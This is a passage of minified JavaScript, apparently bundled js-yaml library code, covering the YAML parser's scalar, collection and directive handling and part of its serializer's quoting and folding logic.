X===48?"\x00":X===97?"\x07":X===98?"\b":X===116?"\t":X===9?"\t":X===110?`
`:X===118?"\v":X===102?"\f":X===114?"\r":X===101?"\x1B":X===32?" ":X===34?'"':X===47?"/":X===92?"\\":X===78?"":X===95?"":X===76?"\u2028":X===80?"\u2029":""}function oE(X){if(X<=65535)return String.fromCharCode(X);return String.fromCharCode((X-65536>>10)+55296,(X-65536&1023)+56320)}var $2=Array(256),z2=Array(256);for(s8=0;s8<256;s8++)$2[s8]=mV(s8)?1:0,z2[s8]=mV(s8);var s8;function sE(X,Q){this.input=X,this.filename=Q.filename||null,this.schema=Q.schema||J2,this.onWarning=Q.onWarning||null,this.legacy=Q.legacy||!1,this.json=Q.json||!1,this.listener=Q.listener||null,this.implicitTypes=this.schema.compiledImplicit,this.typeMap=this.schema.compiledTypeMap,this.length=X.length,this.position=0,this.line=0,this.lineStart=0,this.lineIndent=0,this.firstTabInLine=-1,this.documents=[]}function U2(X,Q){var J={name:X.filename,buffer:X.input.slice(0,-1),position:X.position,line:X.line,column:X.position-X.lineStart};return J.snippet=yS(J),new f9(Q,J)}function c1(X,Q){throw U2(X,Q)}function RJ(X,Q){if(X.onWarning)X.onWarning.call(null,U2(X,Q))}var uV={YAML:function(Q,J,Y){var W,G,H;if(Q.version!==null)c1(Q,"duplication of %YAML directive");if(Y.length!==1)c1(Q,"YAML directive accepts exactly one argument");if(W=/^([0-9]+)\.([0-9]+)$/.exec(Y[0]),W===null)c1(Q,"ill-formed argument of the YAML directive");if(G=parseInt(W[1],10),H=parseInt(W[2],10),G!==1)c1(Q,"unacceptable YAML version of the document");if(Q.version=Y[0],Q.checkLineBreaks=H<2,H!==1&&H!==2)RJ(Q,"unsupported YAML version of the document")},TAG:function(Q,J,Y){var W,G;if(Y.length!==2)c1(Q,"TAG directive accepts exactly two arguments");if(W=Y[0],G=Y[1],!G2.test(W))c1(Q,"ill-formed tag handle (first argument) of the TAG directive");if(e8.call(Q.tagMap,W))c1(Q,'there is a previously declared suffix for "'+W+'" tag handle');if(!H2.test(G))c1(Q,"ill-formed tag prefix (second argument) of the TAG directive");try{G=decodeURIComponent(G)}catch(H){c1(Q,"tag prefix is malformed: "+G)}Q.tagMap[W]=G}};function t8(X,Q,J,Y){var W,G,H,$;if(Q<J){if($=X.input.slice(Q,J),Y){for(W=0,G=$.length;W<G;W+=1)if(H=$.charCodeAt(W),!(H===9||32<=H&&H<=1114111))c1(X,"expected valid JSON character")}else if(pE.test($))c1(X,"the stream contains non-printable characters");X.result+=$}}function cV(X,Q,J,Y){var W,G,H,$;if(!W9.isObject(J))c1(X,"cannot merge mappings; the provided source object is unacceptable");W=Object.keys(J);for(H=0,$=W.length;H<$;H+=1)if(G=W[H],!e8.call(Q,G))Q[G]=J[G],Y[G]=!0}function C7(X,Q,J,Y,W,G,H,$,z){var U,K;if(Array.isArray(W)){W=Array.prototype.slice.call(W);for(U=0,K=W.length;U<K;U+=1){if(Array.isArray(W[U]))c1(X,"nested arrays are not supported inside keys");if(typeof W==="object"&&gV(W[U])==="[object Object]")W[U]="[object Object]"}}if(typeof W==="object"&&gV(W)==="[object Object]")W="[object Object]";if(W=String(W),Q===null)Q={};if(Y==="tag:yaml.org,2002:merge")if(Array.isArray(G))for(U=0,K=G.length;U<K;U+=1)cV(X,Q,G[U],J);else cV(X,Q,G,J);else{if(!X.json&&!e8.call(J,W)&&e8.call(Q,W))X.line=H||X.line,X.lineStart=$||X.lineStart,X.position=z||X.position,c1(X,"duplicated mapping key");if(W==="__proto__")Object.defineProperty(Q,W,{configurable:!0,enumerable:!0,writable:!0,value:G});else Q[W]=G;delete J[W]}return Q}function _G(X){var Q=X.input.charCodeAt(X.position);if(Q===10)X.position++;else if(Q===13){if(X.position++,X.input.charCodeAt(X.position)===10)X.position++}else c1(X,"a line break is expected");X.line+=1,X.lineStart=X.position,X.firstTabInLine=-1}function t0(X,Q,J){var Y=0,W=X.input.charCodeAt(X.position);while(W!==0){while(fX(W)){if(W===9&&X.firstTabInLine===-1)X.firstTabInLine=X.position;W=X.input.charCodeAt(++X.position)}if(Q&&W===35)do W=X.input.charCodeAt(++X.position);while(W!==10&&W!==13&&W!==0);if(l6(W)){_G(X),W=X.input.charCodeAt(X.position),Y++,X.lineIndent=0;while(W===32)X.lineIndent++,W=X.input.charCodeAt(++X.position)}else break}if(J!==-1&&Y!==0&&X.lineIndent<J)RJ(X,"deficient indentation");return Y}function NJ(X){var Q=X.position,J;if(J=X.input.charCodeAt(Q),(J===45||J===46)&&J===X.input.charCodeAt(Q+1)&&J===X.input.charCodeAt(Q+2)){if(Q+=3,J=X.input.charCodeAt(Q),J===0||h9(J))return!0}return!1}function kG(X,Q){if(Q===1)X.result+=" ";else if(Q>1)X.result+=W9.repeat(`
`,Q-1)}function tE(X,Q,J){var Y,W,G,H,$,z,U,K,B=X.kind,q=X.result,Z;if(Z=X.input.charCodeAt(X.position),h9(Z)||I7(Z)||Z===35||Z===38||Z===42||Z===33||Z===124||Z===62||Z===39||Z===34||Z===37||Z===64||Z===96)return!1;if(Z===63||Z===45){if(W=X.input.charCodeAt(X.position+1),h9(W)||J&&I7(W))return!1}X.kind="scalar",X.result="",G=H=X.position,$=!1;while(Z!==0){if(Z===58){if(W=X.input.charCodeAt(X.position+1),h9(W)||J&&I7(W))break}else if(Z===35){if(Y=X.input.charCodeAt(X.position-1),h9(Y))break}else if(X.position===X.lineStart&&NJ(X)||J&&I7(Z))break;else if(l6(Z))if(z=X.line,U=X.lineStart,K=X.lineIndent,t0(X,!1,-1),X.lineIndent>=Q){$=!0,Z=X.input.charCodeAt(X.position);continue}else{X.position=H,X.line=z,X.lineStart=U,X.lineIndent=K;break}if($)t8(X,G,H,!1),kG(X,X.line-z),G=H=X.position,$=!1;if(!fX(Z))H=X.position+1;Z=X.input.charCodeAt(++X.position)}if(t8(X,G,H,!1),X.result)return!0;return X.kind=B,X.result=q,!1}function eE(X,Q){var J,Y,W;if(J=X.input.charCodeAt(X.position),J!==39)return!1;X.kind="scalar",X.result="",X.position++,Y=W=X.position;while((J=X.input.charCodeAt(X.position))!==0)if(J===39)if(t8(X,Y,X.position,!0),J=X.input.charCodeAt(++X.position),J===39)Y=X.position,X.position++,W=X.position;else return!0;else if(l6(J))t8(X,Y,W,!0),kG(X,t0(X,!1,Q)),Y=W=X.position;else if(X.position===X.lineStart&&NJ(X))c1(X,"unexpected end of the document within a single quoted scalar");else X.position++,W=X.position;c1(X,"unexpected end of the stream within a single quoted scalar")}function XT(X,Q){var J,Y,W,G,H,$;if($=X.input.charCodeAt(X.position),$!==34)return!1;X.kind="scalar",X.result="",X.position++,J=Y=X.position;while(($=X.input.charCodeAt(X.position))!==0)if($===34)return t8(X,J,X.position,!0),X.position++,!0;else if($===92){if(t8(X,J,X.position,!0),$=X.input.charCodeAt(++X.position),l6($))t0(X,!1,Q);else if($<256&&$2[$])X.result+=z2[$],X.position++;else if((H=nE($))>0){W=H,G=0;for(;W>0;W--)if($=X.input.charCodeAt(++X.position),(H=rE($))>=0)G=(G<<4)+H;else c1(X,"expected hexadecimal character");X.result+=oE(G),X.position++}else c1(X,"unknown escape sequence");J=Y=X.position}else if(l6($))t8(X,J,Y,!0),kG(X,t0(X,!1,Q)),J=Y=X.position;else if(X.position===X.lineStart&&NJ(X))c1(X,"unexpected end of the document within a double quoted scalar");else X.position++,Y=X.position;c1(X,"unexpected end of the stream within a double quoted scalar")}function QT(X,Q){var J=!0,Y,W,G,H=X.tag,$,z=X.anchor,U,K,B,q,Z,M=Object.create(null),L,R,j,F;if(F=X.input.charCodeAt(X.position),F===91)K=93,Z=!1,$=[];else if(F===123)K=125,Z=!0,$={};else return!1;if(X.anchor!==null)X.anchorMap[X.anchor]=$;F=X.input.charCodeAt(++X.position);while(F!==0){if(t0(X,!0,Q),F=X.input.charCodeAt(X.position),F===K)return X.position++,X.tag=H,X.anchor=z,X.kind=Z?"mapping":"sequence",X.result=$,!0;else if(!J)c1(X,"missed comma between flow collection entries");else if(F===44)c1(X,"expected the node content, but found ','");if(R=L=j=null,B=q=!1,F===63){if(U=X.input.charCodeAt(X.position+1),h9(U))B=q=!0,X.position++,t0(X,!0,Q)}if(Y=X.line,W=X.lineStart,G=X.position,P7(X,Q,OJ,!1,!0),R=X.tag,L=X.result,t0(X,!0,Q),F=X.input.charCodeAt(X.position),(q||X.line===Y)&&F===58)B=!0,F=X.input.charCodeAt(++X.position),t0(X,!0,Q),P7(X,Q,OJ,!1,!0),j=X.result;if(Z)C7(X,$,M,R,L,j,Y,W,G);else if(B)$.push(C7(X,null,M,R,L,j,Y,W,G));else $.push(L);if(t0(X,!0,Q),F=X.input.charCodeAt(X.position),F===44)J=!0,F=X.input.charCodeAt(++X.position);else J=!1}c1(X,"unexpected end of the stream within a flow collection")}function JT(X,Q){var J,Y,W=wG,G=!1,H=!1,$=Q,z=0,U=!1,K,B;if(B=X.input.charCodeAt(X.position),B===124)Y=!1;else if(B===62)Y=!0;else return!1;X.kind="scalar",X.result="";while(B!==0)if(B=X.input.charCodeAt(++X.position),B===43||B===45)if(wG===W)W=B===43?yV:lE;else c1(X,"repeat of a chomping mode identifier");else if((K=aE(B))>=0)if(K===0)c1(X,"bad explicit indentation width of a block scalar; it cannot be less than one");else if(!H)$=Q+K-1,H=!0;else c1(X,"repeat of an indentation width identifier");else break;if(fX(B)){do B=X.input.charCodeAt(++X.position);while(fX(B));if(B===35)do B=X.input.charCodeAt(++X.position);while(!l6(B)&&B!==0)}while(B!==0){_G(X),X.lineIndent=0,B=X.input.charCodeAt(X.position);while((!H||X.lineIndent<$)&&B===32)X.lineIndent++,B=X.input.charCodeAt(++X.position);if(!H&&X.lineIndent>$)$=X.lineIndent;if(l6(B)){z++;continue}if(X.lineIndent<$){if(W===yV)X.result+=W9.repeat(`
`,G?1+z:z);else if(W===wG){if(G)X.result+=`
`}break}if(Y)if(fX(B))U=!0,X.result+=W9.repeat(`
`,G?1+z:z);else if(U)U=!1,X.result+=W9.repeat(`
`,z+1);else if(z===0){if(G)X.result+=" "}else X.result+=W9.repeat(`
`,z);else X.result+=W9.repeat(`
`,G?1+z:z);G=!0,H=!0,z=0,J=X.position;while(!l6(B)&&B!==0)B=X.input.charCodeAt(++X.position);t8(X,J,X.position,!1)}return!0}function lV(X,Q){var J,Y=X.tag,W=X.anchor,G=[],H,$=!1,z;if(X.firstTabInLine!==-1)return!1;if(X.anchor!==null)X.anchorMap[X.anchor]=G;z=X.input.charCodeAt(X.position);while(z!==0){if(X.firstTabInLine!==-1)X.position=X.firstTabInLine,c1(X,"tab characters must not be used in indentation");if(z!==45)break;if(H=X.input.charCodeAt(X.position+1),!h9(H))break;if($=!0,X.position++,t0(X,!0,-1)){if(X.lineIndent<=Q){G.push(null),z=X.input.charCodeAt(X.position);continue}}if(J=X.line,P7(X,Q,W2,!1,!0),G.push(X.result),t0(X,!0,-1),z=X.input.charCodeAt(X.position),(X.line===J||X.lineIndent>Q)&&z!==0)c1(X,"bad indentation of a sequence entry");else if(X.lineIndent<Q)break}if($)return X.tag=Y,X.anchor=W,X.kind="sequence",X.result=G,!0;return!1}function YT(X,Q,J){var Y,W,G,H,$,z,U=X.tag,K=X.anchor,B={},q=Object.create(null),Z=null,M=null,L=null,R=!1,j=!1,F;if(X.firstTabInLine!==-1)return!1;if(X.anchor!==null)X.anchorMap[X.anchor]=B;F=X.input.charCodeAt(X.position);while(F!==0){if(!R&&X.firstTabInLine!==-1)X.position=X.firstTabInLine,c1(X,"tab characters must not be used in indentation");if(Y=X.input.charCodeAt(X.position+1),G=X.line,(F===63||F===58)&&h9(Y)){if(F===63){if(R)C7(X,B,q,Z,M,null,H,$,z),Z=M=L=null;j=!0,R=!0,W=!0}else if(R)R=!1,W=!0;else c1(X,"incomplete explicit mapping pair; a key node is missed; or followed by a non-tabulated empty line");X.position+=1,F=Y}else{if(H=X.line,$=X.lineStart,z=X.position,!P7(X,J,Y2,!1,!0))break;if(X.line===G){F=X.input.charCodeAt(X.position);while(fX(F))F=X.input.charCodeAt(++X.position);if(F===58){if(F=X.input.charCodeAt(++X.position),!h9(F))c1(X,"a whitespace character is expected after the key-value separator within a block mapping");if(R)C7(X,B,q,Z,M,null,H,$,z),Z=M=L=null;j=!0,R=!1,W=!1,Z=X.tag,M=X.result}else if(j)c1(X,"can not read an implicit mapping pair; a colon is missed");else return X.tag=U,X.anchor=K,!0}else if(j)c1(X,"can not read a block mapping entry; a multiline key may not be an implicit key");else return X.tag=U,X.anchor=K,!0}if(X.line===G||X.lineIndent>Q){if(R)H=X.line,$=X.lineStart,z=X.position;if(P7(X,Q,AJ,!0,W))if(R)M=X.result;else L=X.result;if(!R)C7(X,B,q,Z,M,L,H,$,z),Z=M=L=null;t0(X,!0,-1),F=X.input.charCodeAt(X.position)}if((X.line===G||X.lineIndent>Q)&&F!==0)c1(X,"bad indentation of a mapping entry");else if(X.lineIndent<Q)break}if(R)C7(X,B,q,Z,M,null,H,$,z);if(j)X.tag=U,X.anchor=K,X.kind="mapping",X.result=B;return j}function WT(X){var Q,J=!1,Y=!1,W,G,H;if(H=X.input.charCodeAt(X.position),H!==33)return!1;if(X.tag!==null)c1(X,"duplication of a tag property");if(H=X.input.charCodeAt(++X.position),H===60)J=!0,H=X.input.charCodeAt(++X.position);else if(H===33)Y=!0,W="!!",H=X.input.charCodeAt(++X.position);else W="!";if(Q=X.position,J){do H=X.input.charCodeAt(++X.position);while(H!==0&&H!==62);if(X.position<X.length)G=X.input.slice(Q,X.position),H=X.input.charCodeAt(++X.position);else c1(X,"unexpected end of the stream within a verbatim tag")}else{while(H!==0&&!h9(H)){if(H===33)if(!Y){if(W=X.input.slice(Q-1,X.position+1),!G2.test(W))c1(X,"named tag handle cannot contain such characters");Y=!0,Q=X.position+1}else c1(X,"tag suffix cannot contain exclamation marks");H=X.input.charCodeAt(++X.position)}if(G=X.input.slice(Q,X.position),iE.test(G))c1(X,"tag suffix cannot contain flow indicator characters")}if(G&&!H2.test(G))c1(X,"tag name cannot contain such characters: "+G);try{G=decodeURIComponent(G)}catch($){c1(X,"tag name is malformed: "+G)}if(J)X.tag=G;else if(e8.call(X.tagMap,W))X.tag=X.tagMap[W]+G;else if(W==="!")X.tag="!"+G;else if(W==="!!")X.tag="tag:yaml.org,2002:"+G;else c1(X,'undeclared tag handle "'+W+'"');return!0}function GT(X){var Q,J;if(J=X.input.charCodeAt(X.position),J!==38)return!1;if(X.anchor!==null)c1(X,"duplication of an anchor property");J=X.input.charCodeAt(++X.position),Q=X.position;while(J!==0&&!h9(J)&&!I7(J))J=X.input.charCodeAt(++X.position);if(X.position===Q)c1(X,"name of an anchor node must contain at least one character");return X.anchor=X.input.slice(Q,X.position),!0}function HT(X){var Q,J,Y;if(Y=X.input.charCodeAt(X.position),Y!==42)return!1;Y=X.input.charCodeAt(++X.position),Q=X.position;while(Y!==0&&!h9(Y)&&!I7(Y))Y=X.input.charCodeAt(++X.position);if(X.position===Q)c1(X,"name of an alias node must contain at least one character");if(J=X.input.slice(Q,X.position),!e8.call(X.anchorMap,J))c1(X,'unidentified alias "'+J+'"');return X.result=X.anchorMap[J],t0(X,!0,-1),!0}function P7(X,Q,J,Y,W){var G,H,$,z=1,U=!1,K=!1,B,q,Z,M,L,R;if(X.listener!==null)X.listener("open",X);if(X.tag=null,X.anchor=null,X.kind=null,X.result=null,G=H=$=AJ===J||W2===J,Y){if(t0(X,!0,-1)){if(U=!0,X.lineIndent>Q)z=1;else if(X.lineIndent===Q)z=0;else if(X.lineIndent<Q)z=-1}}if(z===1)while(WT(X)||GT(X))if(t0(X,!0,-1)){if(U=!0,$=G,X.lineIndent>Q)z=1;else if(X.lineIndent===Q)z=0;else if(X.lineIndent<Q)z=-1}else $=!1;if($)$=U||W;if(z===1||AJ===J){if(OJ===J||Y2===J)L=Q;else L=Q+1;if(R=X.position-X.lineStart,z===1)if($&&(lV(X,R)||YT(X,R,L))||QT(X,L))K=!0;else{if(H&&JT(X,L)||eE(X,L)||XT(X,L))K=!0;else if(HT(X)){if(K=!0,X.tag!==null||X.anchor!==null)c1(X,"alias node should not have any properties")}else if(tE(X,L,OJ===J)){if(K=!0,X.tag===null)X.tag="?"}if(X.anchor!==null)X.anchorMap[X.anchor]=X.result}else if(z===0)K=$&&lV(X,R)}if(X.tag===null){if(X.anchor!==null)X.anchorMap[X.anchor]=X.result}else if(X.tag==="?"){if(X.result!==null&&X.kind!=="scalar")c1(X,'unacceptable node kind for !<?> tag; it should be "scalar", not "'+X.kind+'"');for(B=0,q=X.implicitTypes.length;B<q;B+=1)if(M=X.implicitTypes[B],M.resolve(X.result)){if(X.result=M.construct(X.result),X.tag=M.tag,X.anchor!==null)X.anchorMap[X.anchor]=X.result;break}}else if(X.tag!=="!"){if(e8.call(X.typeMap[X.kind||"fallback"],X.tag))M=X.typeMap[X.kind||"fallback"][X.tag];else{M=null,Z=X.typeMap.multi[X.kind||"fallback"];for(B=0,q=Z.length;B<q;B+=1)if(X.tag.slice(0,Z[B].tag.length)===Z[B].tag){M=Z[B];break}}if(!M)c1(X,"unknown tag !<"+X.tag+">");if(X.result!==null&&M.kind!==X.kind)c1(X,"unacceptable node kind for !<"+X.tag+'> tag; it should be "'+M.kind+'", not "'+X.kind+'"');if(!M.resolve(X.result,X.tag))c1(X,"cannot resolve a node with !<"+X.tag+"> explicit tag");else if(X.result=M.construct(X.result,X.tag),X.anchor!==null)X.anchorMap[X.anchor]=X.result}if(X.listener!==null)X.listener("close",X);return X.tag!==null||X.anchor!==null||K}function $T(X){var Q=X.position,J,Y,W,G=!1,H;X.version=null,X.checkLineBreaks=X.legacy,X.tagMap=Object.create(null),X.anchorMap=Object.create(null);while((H=X.input.charCodeAt(X.position))!==0){if(t0(X,!0,-1),H=X.input.charCodeAt(X.position),X.lineIndent>0||H!==37)break;G=!0,H=X.input.charCodeAt(++X.position),J=X.position;while(H!==0&&!h9(H))H=X.input.charCodeAt(++X.position);if(Y=X.input.slice(J,X.position),W=[],Y.length<1)c1(X,"directive name must not be less than one character in length");while(H!==0){while(fX(H))H=X.input.charCodeAt(++X.position);if(H===35){do H=X.input.charCodeAt(++X.position);while(H!==0&&!l6(H));break}if(l6(H))break;J=X.position;while(H!==0&&!h9(H))H=X.input.charCodeAt(++X.position);W.push(X.input.slice(J,X.position))}if(H!==0)_G(X);if(e8.call(uV,Y))uV[Y](X,Y,W);else RJ(X,'unknown document directive "'+Y+'"')}if(t0(X,!0,-1),X.lineIndent===0&&X.input.charCodeAt(X.position)===45&&X.input.charCodeAt(X.position+1)===45&&X.input.charCodeAt(X.position+2)===45)X.position+=3,t0(X,!0,-1);else if(G)c1(X,"directives end mark is expected");if(P7(X,X.lineIndent-1,AJ,!1,!0),t0(X,!0,-1),X.checkLineBreaks&&dE.test(X.input.slice(Q,X.position)))RJ(X,"non-ASCII line breaks are interpreted as content");if(X.documents.push(X.result),X.position===X.lineStart&&NJ(X)){if(X.input.charCodeAt(X.position)===46)X.position+=3,t0(X,!0,-1);return}if(X.position<X.length-1)c1(X,"end of the stream or a document separator is expected");else return}function K2(X,Q){if(X=String(X),Q=Q||{},X.length!==0){if(X.charCodeAt(X.length-1)!==10&&X.charCodeAt(X.length-1)!==13)X+=`
`;if(X.charCodeAt(0)===65279)X=X.slice(1)}var J=new sE(X,Q),Y=X.indexOf("\x00");if(Y!==-1)J.position=Y,c1(J,"null byte is not allowed in input");J.input+="\x00";while(J.input.charCodeAt(J.position)===32)J.lineIndent+=1,J.position+=1;while(J.position<J.length-1)$T(J);return J.documents}function zT(X,Q,J){if(Q!==null&&typeof Q==="object"&&typeof J>"u")J=Q,Q=null;var Y=K2(X,J);if(typeof Q!=="function")return Y;for(var W=0,G=Y.length;W<G;W+=1)Q(Y[W])}function UT(X,Q){var J=K2(X,Q);if(J.length===0)return;else if(J.length===1)return J[0];throw new f9("expected a single document in the stream, but found more")}var KT=zT,VT=UT,V2={loadAll:KT,load:VT},B2=Object.prototype.toString,q2=Object.prototype.hasOwnProperty,bG=65279,BT=9,$4=10,qT=13,ZT=32,MT=33,jT=34,CG=35,FT=37,OT=38,AT=39,RT=42,Z2=44,LT=45,LJ=58,DT=61,NT=62,wT=63,IT=64,M2=91,j2=93,CT=96,F2=123,PT=124,O2=125,F9={};F9[0]="\\0";F9[7]="\\a";F9[8]="\\b";F9[9]="\\t";F9[10]="\\n";F9[11]="\\v";F9[12]="\\f";F9[13]="\\r";F9[27]="\\e";F9[34]="\\\"";F9[92]="\\\\";F9[133]="\\N";F9[160]="\\_";F9[8232]="\\L";F9[8233]="\\P";var ST=["y","Y","yes","Yes","YES","on","On","ON","n","N","no","No","NO","off","Off","OFF"],ET=/^[-+]?[0-9_]+(?::[0-9_]+)+(?:\.[0-9_]*)?$/;function TT(X,Q){var J,Y,W,G,H,$,z;if(Q===null)return{};J={},Y=Object.keys(Q);for(W=0,G=Y.length;W<G;W+=1){if(H=Y[W],$=String(Q[H]),H.slice(0,2)==="!!")H="tag:yaml.org,2002:"+H.slice(2);if(z=X.compiledTypeMap.fallback[H],z&&q2.call(z.styleAliases,$))$=z.styleAliases[$];J[H]=$}return J}function _T(X){var Q,J,Y;if(Q=X.toString(16).toUpperCase(),X<=255)J="x",Y=2;else if(X<=65535)J="u",Y=4;else if(X<=4294967295)J="U",Y=8;else throw new f9("code point within a string may not be greater than 0xFFFFFFFF");return"\\"+J+W9.repeat("0",Y-Q.length)+Q}var kT=1,z4=2;function bT(X){this.schema=X.schema||J2,this.indent=Math.max(1,X.indent||2),this.noArrayIndent=X.noArrayIndent||!1,this.skipInvalid=X.skipInvalid||!1,this.flowLevel=W9.isNothing(X.flowLevel)?-1:X.flowLevel,this.styleMap=TT(this.schema,X.styles||null),this.sortKeys=X.sortKeys||!1,this.lineWidth=X.lineWidth||80,this.noRefs=X.noRefs||!1,this.noCompatMode=X.noCompatMode||!1,this.condenseFlow=X.condenseFlow||!1,this.quotingType=X.quotingType==='"'?z4:kT,this.forceQuotes=X.forceQuotes||!1,this.replacer=typeof X.replacer==="function"?X.replacer:null,this.implicitTypes=this.schema.compiledImplicit,this.explicitTypes=this.schema.compiledExplicit,this.tag=null,this.result="",this.duplicates=[],this.usedDuplicates=null}function pV(X,Q){var J=W9.repeat(" ",Q),Y=0,W=-1,G="",H,$=X.length;while(Y<$){if(W=X.indexOf(`
`,Y),W===-1)H=X.slice(Y),Y=$;else H=X.slice(Y,W+1),Y=W+1;if(H.length&&H!==`
`)G+=J;G+=H}return G}function PG(X,Q){return`
`+W9.repeat(" ",X.indent*Q)}function vT(X,Q){var J,Y,W;for(J=0,Y=X.implicitTypes.length;J<Y;J+=1)if(W=X.implicitTypes[J],W.resolve(Q))return!0;return!1}function DJ(X){return X===ZT||X===BT}function U4(X){return 32<=X&&X<=126||161<=X&&X<=55295&&X!==8232&&X!==8233||57344<=X&&X<=65533&&X!==bG||65536<=X&&X<=1114111}function dV(X){return U4(X)&&X!==bG&&X!==qT&&X!==$4}function iV(X,Q,J){var Y=dV(X),W=Y&&!DJ(X);return(J?Y:Y&&X!==Z2&&X!==M2&&X!==j2&&X!==F2&&X!==O2)&&X!==CG&&!(Q===LJ&&!W)||dV(Q)&&!DJ(Q)&&X===CG||Q===LJ&&W}function xT(X){return U4(X)&&X!==bG&&!DJ(X)&&X!==LT&&X!==wT&&X!==LJ&&X!==Z2&&X!==M2&&X!==j2&&X!==F2&&X!==O2&&X!==CG&&X!==OT&&X!==RT&&X!==MT&&X!==PT&&X!==DT&&X!==NT&&X!==AT&&X!==jT&&X!==FT&&X!==IT&&X!==CT}function fT(X){return!DJ(X)&&X!==LJ}function G4(X,Q){var J=X.charCodeAt(Q),Y;if(J>=55296&&J<=56319&&Q+1<X.length){if(Y=X.charCodeAt(Q+1),Y>=56320&&Y<=57343)return(J-55296)*1024+Y-56320+65536}return J}function A2(X){var Q=/^\n* /;return Q.test(X)}var R2=1,SG=2,L2=3,D2=4,w7=5;function hT(X,Q,J,Y,W,G,H,$){var z,U=0,K=null,B=!1,q=!1,Z=Y!==-1,M=-1,L=xT(G4(X,0))&&fT(G4(X,X.length-1));if(Q||H)for(z=0;z<X.length;U>=65536?z+=2:z++){if(U=G4(X,z),!U4(U))return w7;L=L&&iV(U,K,$),K=U}else{for(z=0;z<X.length;U>=65536?z+=2:z++){if(U=G4(X,z),U===$4){if(B=!0,Z)q=q||z-M-1>Y&&X[M+1]!==" ",M=z}else if(!U4(U))return w7;L=L&&iV(U,K,$),K=U}q=q||Z&&(z-M-1>Y&&X[M+1]!==" ")}if(!B&&!q){if(L&&!H&&!W(X))return R2;return G===z4?w7:SG}if(J>9&&A2(X))return w7;if(!H)return q?D2:L2;return G===z4?w7:SG}function yT(X,Q,J,Y,W){X.dump=function(){if(Q.length===0)return X.quotingType===z4?'""':"''";if(!X.noCompatMode){if(ST.indexOf(Q)!==-1||ET.test(Q))return X.quotingType===z4?'"'+Q+'"':"'"+Q+"'"}var G=X.indent*Math.max(1,J),H=X.lineWidth===-1?-1:Math.max(Math.min(X.lineWidth,40),X.lineWidth-G),$=Y||X.flowLevel>-1&&J>=X.flowLevel;function z(U){return vT(X,U)}switch(hT(Q,$,X.indent,H,z,X.quotingType,X.forceQuotes&&!Y,W)){case R2:return Q;case SG:return"'"+Q.replace(/'/g,"''")+"'";case L2:return"|"+rV(Q,X.indent)+nV(pV(Q,G));case D2:return">"+rV(Q,X.indent)+nV(pV(gT(Q,H),G));case w7:return'"'+mT(Q)+'"';default:throw new f9("impossible error: invalid scalar style")}}()}function rV(X,Q){var J=A2(X)?String(Q):"",Y=X[X.length-1]===`
`,W=Y&&(X[X.length-2]===`
`||X===`
`),G=W?"+":Y?"":"-";return J+G+`
`}function nV(X){return X[X.length-1]===`
`?X.slice(0,-1):X}function gT(X,Q){var J=/(\n+)([^\n]*)/g,Y=function(){var U=X.indexOf(`
`);return U=U!==-1?U:X.length,J.lastIndex=U,aV(X.slice(0,U),Q)}(),W=X[0]===`
`||X[0]===" ",G,H;while(H=J.exec(X)){var $=H[1],z=H[2];G=z[0]===" ",Y+=$+(!W&&!G&&z!==""?`
`:"")+aV(z,Q),W=G}return Y}function aV(X,Q){if(X===""||X[0]===" ")return X;var J=/ [^ ]/g,Y,W=0,G,H=0,$=0,z="";while(Y=J.exec(X)){if($=Y.index,$-W>Q)G=H>W?H:$,z+=`
`+X.slice(W,G),W=G+1;H=$}if(z+=`
`,X.length-W>Q&&H>W)z+=X.slice(W,H)+`
`+X.slice(H+1);else z+=X.slice(W);return z.slice(1)}function mT(X){var Q="",J=0,Y;for(var W=0;W<X.length;J>=65536?W+=2:W++)if(J=G4(X,W),Y=F9[J],!Y&&U4(J)){if(Q+=X[W],J>=65536)Q+=X[W+1]}else Q+=Y||_T(J);return Q}function uT(X,Q,J){var Y="",W=X.tag,G,H,$;for(G=0,H=J.length;G<H;G+=1){if($=J[G],X.replacer)$=X.replacer.call(J,String(G),$);if(M8(X,Q,$,!1,!1)||typeof $>"u"&&M8(X,Q,null,!1,!1)){if(Y!=="")Y+=","+(!X.condenseFlow?" ":"");Y+=X.dump}}X.tag=W,X.dump="["+Y+"]"}function oV(X,Q,J,Y){var W="",G=X.tag,H,$,z;for(H=0,$=J.length;H<$;H+=1){if(z=J[H],X.replacer)z=X.replacer.call(J,String(H),z);if(M8(X,Q+1,z,!0,!0,!1,!0)||typeof z>"u"&&M8(X,Q+1,null,!0,!0,!1,!0)){if(!Y||W!=="")W+=PG(X,Q);if(X.dump&&$4===X.dump.charCodeAt(0))W+="-";else W+="- ";W+=X.dump}}X.tag=G,X.dump=W||"[]"}function cT(X,Q,J){var Y="",W=X.tag,G=Object.keys(J),H,$,z,U,K;for(H=0,$=G.length;H<$;H+=1){if(K="",Y!=="")K+=", ";if(X.condenseFlow)K+='"';if(z=G[H],U=J[z],X.replacer)U=X.replacer.call(J,z,U);if(!M8(X,Q,z,!1,!1))continue;if(X.dump.length>1024)K+="? ";if(K+=X.dump+(X.condenseFlow?'"':"")+":"+(X.condenseFlow?"":" "),!M8(X,Q,U,!1,!1))continue;K+=X.dump,Y+=K}X.tag=W,X.dump="{"+Y+"}"}function lT(X,Q,J,Y){var W="",G=X.tag,H=Object.keys(J),$,z,U,K,B,q;if(X.sortKeys===!0)H.sort();else if(typeof X.sortKeys==="function")H.sort(X.sortKeys);else if(X.sortKeys)throw new f9("sortKeys must be a boolean or a function");for($=0,z=H.length;$<z;$+=1){if(q="",!Y||W!=="")q+=PG(X,Q);if(U=H[$],K=J[U],X.replacer)K=X.replacer.call(J,U,K);if(!M8(X,Q+1,U,!0,!0,!0))continue;if(B=X.tag!==null&&X.tag!=="?"||X.dump&&X.dump.length>1024,B)if(X.dump&&$4===X.dump.charCodeAt(0))q+="?";else q+="? ";if(q+=X.dump,B)q+=PG(X,Q);if(!M8(X,Q+1,K,!0,B))continue;if(X.dump&&$4===X.dump.charCodeAt(0))q+=":";else q+=": ";q+=X.dump,W+=q}X.tag=G,X.dump=W||"{}"}function sV(X,Q,J){var Y,W,G,H,$,z;W=J?X.explicitTypes:X.implicitTypes;for(G=0,H=W.length;G<H;G+=1)if($=W[G],($.instanceOf||$.predicate)&&(!$.instanceOf||typeof Q==="object"&&Q instanceof $.instanceOf)&&(!$.predicate||$.predicate(Q))){if(J)if($.multi&&$.representName)X.tag=$.representName(Q);else X.tag=$.tag;else X.tag="?";if($.represent){if(z=X.styleMap[$.tag]||$.defaultStyle,B2.call($.represent)==="[object Function]")Y=$.represent(Q,z);else if(q2.call($.represent,z))Y=$.represent[z](Q,z);else throw new f9("!<"+$.tag+'> tag resolver accepts not "'+z+'" style');X.dump=Y}return!0}return!1}function 